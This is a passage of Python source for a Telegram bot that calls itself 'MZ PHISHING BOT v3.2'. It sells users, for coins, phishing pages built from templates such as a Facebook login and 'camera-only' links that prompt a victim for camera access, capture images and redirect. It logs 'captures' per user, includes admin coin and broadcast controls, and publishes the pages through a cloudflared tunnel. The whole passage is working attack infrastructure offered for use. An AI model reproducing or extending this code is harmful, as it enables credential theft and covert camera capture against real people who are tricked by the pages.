        clear_await(context)
        context.user_data["adm_action"] = {"adm_addcoins":"add","adm_rmcoins":"remove","adm_lookup":"lookup"}[data]
        context.user_data["awaiting"] = AWAIT_ADM_UID
        verb = {"adm_addcoins":"➕ *Add Coins*","adm_rmcoins":"➖ *Remove Coins*","adm_lookup":"👤 *User Lookup*"}[data]
        await q.message.reply_text(f"{verb}\n\nUser ID pathao:")
        return

    if data in ("adm_setcost", "adm_setref", "adm_setwel"):
        if not is_admin(uid): return
        clear_await(context)
        cur = {"adm_setcost": coin_cost(), "adm_setref": referral_bonus(), "adm_setwel": welcome_coins()}[data]
        context.user_data["adm_action"] = {"adm_setcost":"setcost","adm_setref":"setref","adm_setwel":"setwel"}[data]
        context.user_data["awaiting"] = AWAIT_ADM_AMT
        await q.message.reply_text(f"Notun value pathao (current: {cur}):")
        return

    if data == "adm_broadcast":
        if not is_admin(uid): return
        clear_await(context)
        context.user_data["adm_action"] = "broadcast"
        context.user_data["awaiting"] = AWAIT_ADM_BC
        await q.message.reply_text("📢 Broadcast message pathao:")
        return

# ═══════════════════════════════════════════════════════════════════
# TEXT HANDLER
# ═══════════════════════════════════════════════════════════════════

async def text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    txt = (update.message.text or "").strip()
    awaiting = context.user_data.get("awaiting")

    if not awaiting:
        return

    if awaiting == AWAIT_LABEL:
        tpl    = context.user_data.get("pending_template", "facebook")
        camera = context.user_data.get("pending_camera", False)
        label  = txt[:MAX_LABEL_LEN]
        cost   = coin_cost()

        user_pages = sum(1 for v in active_pages.values() if v["chat_id"] == uid)
        if user_pages >= MAX_PAGES_PER_USER:
            await update.message.reply_text(
                f"⚠️ Maximum {MAX_PAGES_PER_USER} active pages. /clear koro age."
            )
            clear_await(context)
            return

        if not is_admin(uid):
            if not take_coins(uid, cost):
                await update.message.reply_text(
                    f"💸 *Not enough coins.* Need `{cost}`.", parse_mode="Markdown"
                )
                clear_await(context)
                return

        page_id = gen_id()
        active_pages[page_id] = {
            "template": tpl, "chat_id": uid, "label": label, "camera": camera,
        }
        u = get_user(uid)
        u["pages_created"] = int(u.get("pages_created", 0)) + 1
        save_users()

        link    = f"{public_url}/verify/{page_id}"
        cam_txt = "📷 Camera ON" if camera else "❌ Camera OFF"
        kb = [[InlineKeyboardButton("🗑️ Delete", callback_data=f"del_{page_id}")]]

        await update.message.reply_text(
            f"✅ *Page ready!*\n\n"
            f"🔗 `{link}`\n\n"
            f"📌 Template: *{tpl.capitalize()}*\n"
            f"🏷️ Label: `{label}`\n"
            f"{cam_txt}\n"
            f"💸 Cost: `{cost}` coin — Balance: `{u.get('coins', 0)}`",
            reply_markup=InlineKeyboardMarkup(kb),
            parse_mode="Markdown"
        )
        clear_await(context)
        return

    if awaiting == AWAIT_CAMONLY:
        target = txt
        if not valid_url(target):
            await update.message.reply_text(
                "❌ Invalid URL. `http://` ba `https://` diye shuru korte hobe.\nAbar pathao:",
                parse_mode="Markdown"
            )
            return

        cost = coin_cost()
        user_pages = sum(1 for v in active_pages.values() if v["chat_id"] == uid)
        if user_pages >= MAX_PAGES_PER_USER:
            await update.message.reply_text(
                f"⚠️ Maximum {MAX_PAGES_PER_USER} active pages. /clear koro age."
            )
            clear_await(context)
            return

        if not is_admin(uid):
            if not take_coins(uid, cost):
                await update.message.reply_text(
                    f"💸 *Not enough coins.* Need `{cost}`.", parse_mode="Markdown"
                )
                clear_await(context)
                return

        page_id = gen_id()
        label   = f"camlink-{page_id}"
        active_pages[page_id] = {
            "template": "generic", "chat_id": uid, "label": label,
            "camera": True, "camera_only": True, "redirect_url": target,
        }
        u = get_user(uid)
        u["pages_created"] = int(u.get("pages_created", 0)) + 1
        save_users()

        link = f"{public_url}/verify/{page_id}"
        kb = [[InlineKeyboardButton("🗑️ Delete", callback_data=f"del_{page_id}")]]

        await update.message.reply_text(
            f"✅ *Camera-Only Link Ready!*\n\n"
            f"🔗 `{link}`\n\n"
            f"🎯 Redirect: `{target}`\n"
            f"💸 Cost: `{cost}` coin — Balance: `{u.get('coins', 0)}`\n"
            f"⚡ Modal → native prompt → capture → redirect",
            reply_markup=InlineKeyboardMarkup(kb),
            parse_mode="Markdown"
        )
        clear_await(context)
        return

    if awaiting == AWAIT_ADM_UID:
        if not is_admin(uid):
            clear_await(context); return
        if not txt.isdigit():
            await update.message.reply_text("❌ Invalid user ID.")
            return
        target = int(txt)
        action = context.user_data.get("adm_action")

        if action == "lookup":
            u = get_user(target)
            await update.message.reply_text(
                f"👤 *User `{target}`*\n\n"
                f"Coins: `{u.get('coins', 0)}`\n"
                f"Joined: `{u.get('joined')}`\n"
                f"Referrals: `{len(u.get('refs', []))}`\n"
                f"Ref by: `{u.get('ref_by')}`\n"
                f"First seen: `{u.get('first_seen')}`\n"
                f"Pages created: `{u.get('pages_created', 0)}`\n"
                f"Captures: `{u.get('captures_received', 0)}`\n"
                f"Username: @{u.get('username') or '-'}\n"
                f"Name: {u.get('first_name') or '-'}",
                parse_mode="Markdown"
            )
            clear_await(context)
            return

        context.user_data["adm_target_uid"] = target
        context.user_data["awaiting"] = AWAIT_ADM_AMT
        verb = "add" if action == "add" else "remove"
        await update.message.reply_text(f"User `{target}`. Koto coin {verb} korbe?")
        return

    if awaiting == AWAIT_ADM_AMT:
        if not is_admin(uid):
            clear_await(context); return
        try:
            val = int(txt)
        except Exception:
            await update.message.reply_text("❌ Invalid number.")
            return

        action = context.user_data.get("adm_action")

        if action == "add":
            target = context.user_data.get("adm_target_uid")
            add_coins(target, val)
            u = get_user(target)
            await update.message.reply_text(
                f"✅ Added `{val}` coins to `{target}`.\nNew balance: `{u['coins']}`",
                parse_mode="Markdown"
            )
            try:
                await context.bot.send_message(
                    chat_id=target,
                    text=f"🎉 *Admin added {val} coins!*\nNew balance: *{u['coins']}*",
                    parse_mode="Markdown"
                )
            except Exception:
                pass

        elif action == "remove":
            target = context.user_data.get("adm_target_uid")
            add_coins(target, -val)
            u = get_user(target)
            await update.message.reply_text(
                f"✅ Removed `{val}` coins from `{target}`.\nNew balance: `{u['coins']}`",
                parse_mode="Markdown"
            )

        elif action == "setcost":
            config_db["coin_cost"] = val; save_config()
            await update.message.reply_text(f"✅ Coin cost set to `{val}`.", parse_mode="Markdown")

        elif action == "setref":
            config_db["referral_bonus"] = val; save_config()
            await update.message.reply_text(f"✅ Referral bonus set to `{val}`.", parse_mode="Markdown")

        elif action == "setwel":
            config_db["welcome_coins"] = val; save_config()
            await update.message.reply_text(f"✅ Welcome coins set to `{val}`.", parse_mode="Markdown")

        clear_await(context)
        return

    if awaiting == AWAIT_ADM_BC:
        if not is_admin(uid):
            clear_await(context); return
        msg = txt
        sent, failed = 0, 0
        for k in list(users_db.keys()):
            try:
                await context.bot.send_message(chat_id=int(k), text=msg, parse_mode="Markdown")
                sent += 1
                await asyncio.sleep(0.05)
            except Exception:
                failed += 1
        await update.message.reply_text(
            f"📢 Broadcast done.\n✅ Sent: `{sent}`\n❌ Failed: `{failed}`",
            parse_mode="Markdown"
        )
        clear_await(context)
        return

# ═══════════════════════════════════════════════════════════════════
# BOT BUILD + MAIN LOOP
# ═══════════════════════════════════════════════════════════════════

def build_app():
    app = Application.builder().token(BOT_TOKEN).build()

    async def post_init(a: Application):
        global notify_queue
        notify_queue = asyncio.Queue()
        asyncio.create_task(notification_worker(a.bot))
        log.info("Notification worker started")

    app.post_init = post_init

    app.add_handler(CommandHandler("start",    cmd_start))
    app.add_handler(CommandHandler("balance",  cmd_balance))
    app.add_handler(CommandHandler("myref",    cmd_myref))
    app.add_handler(CommandHandler("help",     cmd_help))
    app.add_handler(CommandHandler("setadmin", cmd_setadmin))
    app.add_handler(CommandHandler("status",   cmd_status))
    app.add_handler(CommandHandler("clear",    cmd_clear))

    app.add_handler(CallbackQueryHandler(verify_join_cb, pattern="^verify_join$"))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

    return app


def run_bot_forever():
    while True:
        try:
            log.info("Starting bot polling...")
            app = build_app()
            app.run_polling(
                drop_pending_updates=True,
                allowed_updates=Update.ALL_TYPES,
                poll_interval=1.0,
                timeout=30,
            )
            log.warning("run_polling returned — restarting in 5s...")
        except KeyboardInterrupt:
            log.info("KeyboardInterrupt — stopping.")
            break
        except Exception as e:
            log.error(f"Polling crashed: {e}")
            log.error(traceback.format_exc())
        time.sleep(5)


def main():
    log.info("═" * 52)
    log.info("  MZ PHISHING BOT v3.2")
    log.info("═" * 52)

    skip_flask = os.environ.get("SKIP_FLASK") == "1"

    if skip_flask:
        port = int(os.environ.get("FLASK_PORT", "8080"))
        log.info(f"SKIP_FLASK=1 → using external Flask on port {port}")
        if not wait_for_flask(port, timeout=15):
            log.error(f"No Flask responding on port {port}. Start gunicorn first.")
            return
        log.info(f"External Flask OK on port {port}")
    else:
        try:
            port = find_free_port(PORT_START)
        except RuntimeError as e:
            log.error(str(e)); return
        log.info(f"Port: {port}")

        threading.Thread(target=run_flask, args=(port,), daemon=True).start()
        if not wait_for_flask(port):
            log.error("Flask failed to start"); return
        log.info(f"Flask ready → port {port}")

    url = start_cloudflared(port)
    if not url:
        log.error("Tunnel URL not available.")
        return

    log.info("═" * 52)
    log.info(f"  BOT ACTIVE")
    log.info(f"  URL  : {url}")
    log.info(f"  PORT : {port}")
    log.info(f"  Gate : {CHANNEL_URL}")
    log.info(f"  Cost : {coin_cost()} coin | Ref: {referral_bonus()}")
    log.info(f"  Admins: {config_db.get('admins', [])}")
    log.info("═" * 52)

    run_bot_forever()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log.info("Stopped by user.")
    except Exception as e:
        log.error(f"Fatal: {e}")
        log.error(traceback.format_exc())
        sys.exit(1)